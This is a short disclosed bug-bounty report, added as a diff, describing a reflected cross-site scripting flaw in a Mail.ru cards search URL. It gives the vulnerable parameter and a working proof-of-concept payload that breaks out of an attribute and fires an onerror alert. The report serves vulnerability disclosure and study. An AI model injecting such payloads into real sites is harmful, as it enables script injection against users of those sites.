@@ -1,0 +1,19 @@
+ReportLink:https://hackerone.com/reports/8472
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/chandrakant
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:10.09.2014 10:10:58
+
+Summary:
+
+http://cards.mail.ru/search/?search=
+
+
+Vulnreable to reflected XSS 
+
+Payload 
+"><img src=x onerror=alert('XSS')><!--
+See Screen Shot
